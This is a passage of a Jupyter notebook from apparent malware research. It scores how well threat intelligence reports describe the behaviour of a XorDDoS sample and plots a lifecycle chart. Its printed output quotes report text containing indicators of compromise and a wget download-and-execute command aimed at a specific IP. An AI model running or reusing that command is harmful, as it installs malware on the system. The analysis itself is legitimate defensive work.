   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, psutil\n",
    "def print_mem_usage():\n",
    "    process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    print(f\"=== mem_usage: {mem_usage:.2f} MB ===\")  # in MiB \n",
    "\n",
    "def get_mem_usage() -> int:\n",
    "    # process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    return mem_usage\n",
    "\n",
    "def run_family_set_procedure(sample: Sample) -> FamilySet:\n",
    "    # family, regexMaster is global variable\n",
    "    operationEvaluator = OperationEvaluator()\n",
    "    \n",
    "    fset = FamilySet(family, regexMaster, sample=sample)\n",
    "    for i,rdf in enumerate(xor_report_dfs):\n",
    "        # rem = ReportEvalModel(base_data, rdf, dofloo_report_names[i])\n",
    "        fset.add_rem(rdf, xor_report_names[i])\n",
    "    # result_tbl = fset.show_result(apply_weight=False)\n",
    "    # result_tbl.to_csv(f'{outputfolder}/{family}_{sample.samplename[:3]}_FamilySet_by_Regex.csv', index=False)\n",
    "    # print(f\"Sample {sample.samplename[:3]} has ttl_match {result_tbl['ttl_match'].sum()} on all documents.\") \n",
    "\n",
    "    # Calculate metrics\n",
    "    print_mem_usage()\n",
    "    print(f\"asg_object: {set([op.object for op in sample.OPset])}\\n\")\n",
    "    fset.sample.OPset_sysOnly_ordered = [op for op in sample.OPset if op.object.find('/etc') != -1\\\n",
    "                                         and op.action in operationEvaluator.update_syscall_list] # UPDATE系統設定的OP\n",
    "    fset.sample.OPset_sysOnly_ordered_index = [sample.OPset_ordered.index(op) for op in fset.sample.OPset_sysOnly_ordered]\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        # asg_object = set([op.object for op in sample.OPset])\n",
    "        # ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        if rem.reportname == 'Xorddos-Microsoft.csv': # 除錯用\n",
    "            continue\n",
    "        print(f\"\\nSample {rem.reportname}\")\n",
    "        print(f\"\\tnum of segment in report: {len(rem.sentences)}\")\n",
    "        print(f\"\\tlenght of ctd's OPset is {len(rem.doc_OPset)}\")\n",
    "\n",
    "        # R_malObj 比較物件\n",
    "        asg_object = set([op.object for op in sample.OPset])\n",
    "        ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        ctd_object = ctd_object.intersection(asg_object)\n",
    "        numerator = len(ctd_object) # 分子\n",
    "        denominator = len(asg_object) # 分母\n",
    "        R_malObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malObj is {R_malObj:.4f}\")\n",
    "        print(f\"\\t\\tctd_object: {ctd_object}\")\n",
    "\n",
    "        # R_malSysObj 比較系統物件\n",
    "        asg_sysobj = list(filter(lambda object: object.find('/etc') != -1, asg_object))\n",
    "        ctd_sysobj = list(filter(lambda object: object.find('/etc') != -1, ctd_object))\n",
    "        numerator = len(ctd_sysobj)\n",
    "        denominator = len(asg_sysobj)\n",
    "        R_malSysObj = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malSysObj\\n\\tnum of ctd objects: {numerator}, num of asg objects: {denominator}. R_malSysObj is {R_malSysObj:.4f}\")\n",
    "\n",
    "        # R_malOps 比較動作和物件\n",
    "        asg_OPset = list(sample.OPset)\n",
    "        ctd_OPset = list(rem.doc_OPset)\n",
    "        numerator, denominator, hits = 0, len(asg_OPset), []\n",
    "        hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        sys_hits: list[tuple[OperationPair, OperationPair]] = []\n",
    "        print(f\"\\t\\tlen(asg_OPset): {len(asg_OPset)}, len(ctd_OPset): {len(ctd_OPset)}\")\n",
    "        # 每一個 asg_op 跟所有同物件的的 ctd_op 進行 resolve() 比對，來判斷此 asg_op 是否被提及\n",
    "        i = 0\n",
    "        for idx_asg, asg_op in enumerate(asg_OPset): \n",
    "            i += 1\n",
    "            # print(f\"\\tno.{i} asg_op {asg_op}\") # 瓶頸卡在 no.51 step (total 71 step)\n",
    "            target_obj = asg_op.object\n",
    "            ctdSameObjOpsIdx = [i for i, x in enumerate(ctd_OPset) if x.object == target_obj]\n",
    "            # if i==51:\n",
    "            # print(f\"\\tno.{i} | asg_op {asg_op}, len of ctdSameObjOpsIdx: {ctdSameObjOpsIdx}\")\n",
    "            # ctdSameObjOps = [x for x in ctd_OPset if x.object == target_obj]\n",
    "            for idx in ctdSameObjOpsIdx:\n",
    "                pass\n",
    "                # mem_before_create_lst = get_mem_usage()\n",
    "                # print(\"\\tbefore resolve\", mem_before_create_lst)\n",
    "                entityType = get_object_type(asg_op.object)\n",
    "                (hit, isSysChange) = operationEvaluator.resolve(entityType, asg_op.action, ctd_OPset[idx].action)\n",
    "                # # print_mem_usage()\n",
    "                # mem_after_create_lst = get_mem_usage()\n",
    "                # # print(f\"\\t=== diff of mem_usage calling resolve(): {mem_after_create_lst - mem_before_create_lst:.2f}  ===\")\n",
    "\n",
    "                if hit:\n",
    "                    numerator += 1\n",
    "                    hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "                    fset.rem_lst[idx_rem].match_doc_OPset.add(ctd_OPset[idx])\n",
    "\n",
    "                    # 篩選出系統物件的動作\n",
    "                    if isSysChange and asg_OPset[idx_asg].object.find('/etc') != -1:\n",
    "                        sys_hits.append((asg_OPset[idx_asg], ctd_OPset[idx]))\n",
    "\n",
    "                    # 紀錄CTD的生命週期 (ASG_OP提及順序)\n",
    "                    step_num = sample.OPset_ordered.index(asg_op) # index of step, throw ValueError if not found\n",
    "                    fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "                    break\n",
    "        R_malOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malOps is {R_malOps:.4f}\")\n",
    "        print(f\"\\t\\trefered lifecycle: {fset.rem_lst[idx_rem].OPset_order_index}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        # fset.rem_lst[idx_rem].OPset_order_index.clear()\n",
    "        # for ctd_op in fset.rem_lst[idx_rem].match_doc_OPset:\n",
    "        #     step_num = sample.OPset_ordered.index(ctd_op) # index of step, throw ValueError if not found\n",
    "        #     fset.rem_lst[idx_rem].OPset_order_index.append(step_num)\n",
    "\n",
    "        # R_malChangeOps 篩選出系統物件的動作\n",
    "        # cando: 加上 OPMode的考量，為class OP加兩個mode asg_op_mode, ctd_op_mode。目前直接用call nlp class 的 method判別。\n",
    "        numerator = len(sys_hits)\n",
    "        sys_asg_OPset = [op for op in asg_OPset if op.object.find('/etc') != -1 \\\n",
    "                         and op.action in operationEvaluator.update_syscall_list ]\n",
    "        # print('sys_asg_OPset is unique:', len(sample.OPset_ordered) == len(set(sample.OPset_ordered))) # 元速度重複沒錯，可能是 index() 的問題\n",
    "        denominator = len(sys_asg_OPset)\n",
    "        R_malChangeOps = 0 if denominator == 0 else numerator/denominator\n",
    "        print(f\"\\t#R_malChangeOps\\n\\tnum of matched asg op: {numerator}, num of asg op: {denominator}. R_malChangeOps is {R_malChangeOps:.4f}\")\n",
    "\n",
    "        # 紀錄CTD的生命週期 (OP提及順序)\n",
    "        fset.rem_lst[idx_rem].SysOPset_order_index.clear()\n",
    "        for asg_op , ctd_op in sys_hits:\n",
    "            step_num = sample.OPset_ordered.index(asg_op) # step index , throw ValueError if not found\n",
    "            fset.rem_lst[idx_rem].SysOPset_order_index.append(step_num)\n",
    "        print(f\"\\t\\tref-sys lifecycle: {fset.rem_lst[idx_rem].SysOPset_order_index}\")\n",
    "\n",
    "        if hits:\n",
    "            print(\"\\n\\thits\")\n",
    "            for asg_op, ctd_op in hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "        if sys_hits:\n",
    "            print(\"\\n\\tsys_hits\")\n",
    "            for asg_op, ctd_op in sys_hits:\n",
    "                print(f\"\\t{asg_op}, {ctd_op.getSentStr()}\")\n",
    "\n",
    "        # print_mem_usage()\n",
    "        # del asg_OPset, ctd_OPset, hits, sys_hits\n",
    "    print(\"\\n\\nOperationPair that changes system resources:\\n\", sys_asg_OPset)\n",
    "\n",
    "    return fset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "def save_match_sent_to_excel(fset: FamilySet, sample_name=None):\n",
    "    columns = ['report','regex','matched word','sentence number','sentence']\n",
    "    if sample_name:\n",
    "        output_xlsx = f'{outputfolder}/{family}_{sample_name[:3]}_report_match_sent.csv'\n",
    "    else:\n",
    "        output_xlsx = f'{outputfolder}/{family}_union_report_match_sent.csv'\n",
    "    has_match = sum([len(rem.get_match_regexs()) for rem in fset.rem_lst])\n",
    "    if has_match == 0:\n",
    "        print('no matches in CTI reports') # with open 一定要寫入，若全空則直接不開檔\n",
    "        return\n",
    "    # with pd.ExcelWriter(output_xlsx, engine='openpyxl') as writer:\n",
    "    \n",
    "    # 遍歷報告，一個 rem: ReportEvalModel 代表一篇報告\n",
    "    csv_data = []\n",
    "    match_sentence_ttlcnt = 0\n",
    "    for rem in fset.rem_lst:\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        if len(rem.get_match_regexs()) == 0: # 如果報告中無 regex 跳過不紀錄\n",
    "            continue\n",
    "        # sheet_data = [] # shape = columns_len * match_sent_len\n",
    "        sent_df = rem.get_match_sentences()\n",
    "        sent_content_lst = rem.sentences['Content'] # 報告中的每個句子\n",
    "        match_sentence_ttlcnt += sent_df['match'].sum()\n",
    "\n",
    "        # 遍歷每個含有 regex 的句子\n",
    "        for sid, row in sent_df.iterrows():\n",
    "            if row['match'] == 0:\n",
    "                continue\n",
    "            row.drop('match', inplace=True)\n",
    "            row = row[row > 0]\n",
    "            # print(row)\n",
    "            # 考量每個句子可能含有多個 regex，故需寫成多行\n",
    "            for i, v in row.items():\n",
    "                insert_data = dict().fromkeys(columns)\n",
    "                insert_data['report'] = reportname\n",
    "                insert_data['regex'] = i\n",
    "                insert_data['matched word'] = rem.get_match_word(sid, i)\n",
    "                insert_data['sentence number'] = sid + 1\n",
    "                insert_data['sentence'] = str(sent_content_lst[sid]).strip()\n",
    "                # sheet_data.append(insert_data)\n",
    "                csv_data.append(insert_data)\n",
    "    df = pd.DataFrame(csv_data)\n",
    "    # print(df)\n",
    "    df.to_csv(output_xlsx, index=False)\n",
    "\n",
    "            # 輸出 csv\n",
    "            \n",
    "            # 輸出 excel sheet\n",
    "            # print(rem.reportname,'has', len(sheet_data),'matches')\n",
    "            # output_sheet = pd.DataFrame(sheet_data)\n",
    "            # # output_sheet.style.set_properties(subset=['sentence'])\n",
    "            # styler = Styler(horizontal_alignment='left', vertical_alignment='top')\n",
    "            # sf = StyleFrame(output_sheet, styler)\n",
    "            # sf = sf.set_column_width(columns=['baseline'], width=20.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence number'], width=15.0)\n",
    "            # sf = sf.set_column_width(columns=['sentence'], width=80.0)\n",
    "            # sf.to_excel(writer, sheet_name=rem.reportname, index=False) #.save()\n",
    "            # # output_sheet.to_excel(writer, sheet_name=rem.reportname, index=False)\n",
    "    return match_sentence_ttlcnt\n",
    "\n",
    "# 此行會執行並複寫 excel，執行完後要手動調整行距格式，小心使用\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of the model checkpoint at bert-base-uncased were not used when initializing BertModel: ['cls.predictions.decoder.weight', 'cls.seq_relationship.weight', 'cls.seq_relationship.bias', 'cls.predictions.bias', 'cls.predictions.transform.dense.bias', 'cls.predictions.transform.dense.weight', 'cls.predictions.transform.LayerNorm.weight', 'cls.predictions.transform.LayerNorm.bias']\n",
      "- This IS expected if you are initializing BertModel from the checkpoint of a model trained on another task or with another architecture (e.g. initializing a BertForSequenceClassification model from a BertForPreTraining model).\n",
      "- This IS NOT expected if you are initializing BertModel from the checkpoint of a model that you expect to be exactly identical (initializing a BertForSequenceClassification model from a BertForSequenceClassification model).\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "=== mem_usage: 811.62 MB ===\n",
      "asg_object: {'^sh$', '/selinux', 'update-rc.d', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/run/', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}:\\\\d{1,5}$', '^chkconfig$', '/boot/[a-z]{10}', 'bin/sed', '/var/', '/etc/rc', '/boot/', '/var/run/', 'bin/insserv', 'permission(\\\\s|:)[0-9]{1,4}', '/etc/init.d/', '/perl/', '[a-zA-z]:\\\\d{1,5}$', '^pipe(\\\\$|\\\\.|$)', '^sed$', 'bin/openrc', '^systemctl$', '/proc/', '/etc/sed', '/proc/rs_dev', '/etc/cron'}\n",
      "\n",
      "\n",
      "Sample Xorddos-Cdnetworks.csv\n",
      "\tnum of segment in report: 32\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Crowdstrike.csv\n",
      "\tnum of segment in report: 45\n",
      "\tlenght of ctd's OPset is 0\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000\n",
      "\t\tctd_object: set()\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 0\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000\n",
      "\t\trefered lifecycle: []\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "Sample Xorddos-Intezer.csv\n",
      "\tnum of segment in report: 156\n",
      "\tlenght of ctd's OPset is 7\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538\n",
      "\t\tctd_object: {'/etc/rc', '/proc/', '\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}', '/etc/init.d/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 7\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274\n",
      "\t\trefered lifecycle: [0, 18]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\t<OP19 act=open, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key\tdescription\tcomment hostip\tip\thardcoded to 127.0.0.1 softtype\t\thardcoded to “linux” pscaddr\tmac address\t hostname\tmachine name\t hosttar\tusername\tpossibly “host target” hostos\tdistribution\textracted from /etc/issue or /etc/redhat-release hostcpu\tclock speed\t/proc/cpuinfo hostmem\tamount of memory\t/proc/meminfo hostpack\t\thardcoded to “linux” lkmtag\tis rootkit enabled\t kernel\tkernel version\textracted from unamefigure 12 shows the communication between redxor and the c2.>\n",
      "\n",
      "Sample Xorddos-Ms.csv\n",
      "\tnum of segment in report: 252\n",
      "\tlenght of ctd's OPset is 51\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615\n",
      "\t\tctd_object: {'^sh$', '/proc/', '/var/run/', '^chkconfig$', 'update-rc.d', '/etc/init.d/', '/run/', '/proc/rs_dev', '/etc/cron', '/var/', '[a-zA-z]:\\\\d{1,5}$', '/etc/rc'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 51\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 8, num of asg op: 73. R_malOps is 0.1096\n",
      "\t\trefered lifecycle: [52, 15, 0, 12, 26, 67, 51, 50]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP53 act=open, obj=/var/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path\tfile type\tsha-256 /etc/init.d/hflggwyfsc.elf\tshell script\t6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh\tshell script\tcbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so\telf\tf2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid\ttext\t932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq\telf\t798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq\telf\t2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic\telf\te6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah\telf\tb5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa\telf\td71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz\telf\t9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn\telf\t360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh\telf\tdc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk\telf\t175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script\tbash script\t8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq\telf\t53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv\telf\t359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq\telf\tef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul\telf (rootkit)\t483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv\telf (rootkit)\tc8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>\n",
      "\t<OP 1 act=readlink, obj=/proc/>, <OP35 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>\n",
      "\t<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>\n",
      "\t<OP27 act=clone, obj=^chkconfig$>, <OP25 act=add, obj=chkconfig, sent=the commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.>\n",
      "\t<OP68 act=access, obj=/proc/>, <OP14 act=check, obj=/proc/$pid, sent=a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.>\n",
      "\t<OP52 act=open, obj=/var/run/>, <OP31 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\t<OP51 act=open, obj=/run/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>\n",
      "\n",
      "Sample Xorddos-Trendmicro.csv\n",
      "\tnum of segment in report: 27\n",
      "\tlenght of ctd's OPset is 6\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308\n",
      "\t\tctd_object: {'/etc/rc', '/var/run/', '/etc/cron', '/var/', '[a-zA-z]:\\\\d{1,5}$', '/run/'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 6\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 1, num of asg op: 73. R_malOps is 0.0137\n",
      "\t\trefered lifecycle: [15]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>\n",
      "\n",
      "Sample Xorddos-Trendmicro2.csv\n",
      "\tnum of segment in report: 47\n",
      "\tlenght of ctd's OPset is 2\n",
      "\t#R_malObj\n",
      "\tnum of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385\n",
      "\t\tctd_object: {'\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}'}\n",
      "\t#R_malSysObj\n",
      "\tnum of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000\n",
      "\t\tlen(asg_OPset): 73, len(ctd_OPset): 2\n",
      "\t#R_malOps\n",
      "\tnum of matched asg op: 1, num of asg op: 73. R_malOps is 0.0137\n",
      "\t\trefered lifecycle: [61]\n",
      "\t#R_malChangeOps\n",
      "\tnum of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000\n",
      "\t\tref-sys lifecycle: []\n",
      "\n",
      "\thits\n",
      "\t<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>\n",
      "\n",
      "\n",
      "OperationPair that changes system resources:\n",
      " [<OP45 act=write, obj=/etc/sed>, <OP22 act=write, obj=/etc/rc>, <OP48 act=rename, obj=/etc/cron>, <OP18 act=write, obj=/etc/cron>, <OP47 act=fchmod, obj=/etc/sed>, <OP15 act=write, obj=/etc/init.d/>]\n"
     ]
    }
   ],
   "source": [
    "for sample in samples:\n",
    "    # print(len(sample.OPset)) # 30\n",
    "    # print(len(sample.OPset_ordered)) # 30\n",
    "    # print(set(sample.OPset) - set(sample.OPset_ordered)) # 相減是空的set 都OK\n",
    "    fset = run_family_set_procedure(sample)\n",
    "    # match_sentence_ttlcnt = save_match_sent_to_excel(fset, sample.samplename)\n",
    "    # print(f'match_sentence_ttlcnt is {match_sentence_ttlcnt}\\n---\\n')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw Lifecycle diagram\n",
    "- 兩個 traces (legend) 一般的 OP 和 ChangeSys OP。分兩個顏色，不重疊。\n",
    "- x: [a,a,a,a,b,b,b,c,c,c] 不同 report 的 step 可以放同一個 list，因為屬於同個 trace。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\luweb\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\plotly\\io\\_renderers.py:7: DeprecationWarning:\n",
      "\n",
      "The distutils package is deprecated and slated for removal in Python 3.12. Use setuptools or check PEP 632 for potential alternatives\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "marker": {
          "color": "darkorange",
          "size": 12
         },
         "mode": "markers",
         "name": "Normal Operation Pair",
         "type": "scatter",
         "x": [
          1,
          19,
          53,
          16,
          1,
          13,
          27,
          68,
          52,
          51,
          16,
          62,
          1,
          2,
          3,
          4,
          5,
          6,
          7,
          8,
          9,
          10,
          11,
          12,
          13,
          14,
          16,
          17,
          19,
          20,
          21,
          23,
          24,
          25,
          26,
          27,
          28,
          29,
          30,
          31,
          32,
          33,
          34,
          35,
          36,
          37,
          38,
          39,
          40,
          41,
          42,
          43,
          44,
          46,
          49,
          50,
          51,
          52,
          53,
          54,
          55,
          56,
          57,
          58,
          59,
          60,
          61,
          62,
          63,
          64,
          65,
          66,
          67,
          68,
          69,
          70,
          71,
          72,
          73
         ],
         "y": [
          "Intezer (2)",
          "Intezer (2)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Microsoft (8)",
          "Trendmicro (1)",
          "Trendmicro2 (1)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        },
        {
         "marker": {
          "color": "blue",
          "size": 12
         },
         "mode": "markers",
         "name": "Change SR Operation Pair",
         "type": "scatter",
         "x": [
          45,
          22,
          48,
          18,
          47,
          15
         ],
         "y": [
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)",
          "ASG (73)"
         ]
        }
       ],
       "layout": {
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
